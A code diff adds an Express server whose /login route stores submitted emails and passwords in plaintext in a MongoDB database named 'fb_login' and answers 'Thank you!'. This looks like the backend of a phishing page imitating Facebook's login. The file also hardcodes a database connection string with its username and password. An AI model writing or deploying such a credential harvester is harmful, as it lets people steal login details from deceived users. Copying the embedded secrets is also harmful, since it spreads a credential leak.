@@ -1,0 +1,41 @@
+const express = require("express");
+const mongoose = require("mongoose");
+const path = require("path");
+const bodyParser = require("body-parser");
+
+const app = express();
+
+// Middleware
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, "public")));
+
+// MongoDB connection
+mongoose
+  .connect(
+    "mongodb+srv://youssef:youssef@cluster0.izwruzm.mongodb.net/fb_login",
+    {
+      useNewUrlParser: true,
+      useUnifiedTopology: true,
+    }
+  )
+  .then(() => console.log("Connected to MongoDB"))
+  .catch((err) => console.error("MongoDB error:", err));
+
+// Schema
+const LoginSchema = new mongoose.Schema({
+  email: String,
+  password: String,
+});
+const Login = mongoose.model("Login", LoginSchema);
+
+// Handle form submission
+app.post("/login", async (req, res) => {
+  const { email, password } = req.body;
+  await Login.create({ email, password });
+  res.send("Thank you!");
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () =>
+  console.log(`Server running on http://localhost:${PORT}`)
+);
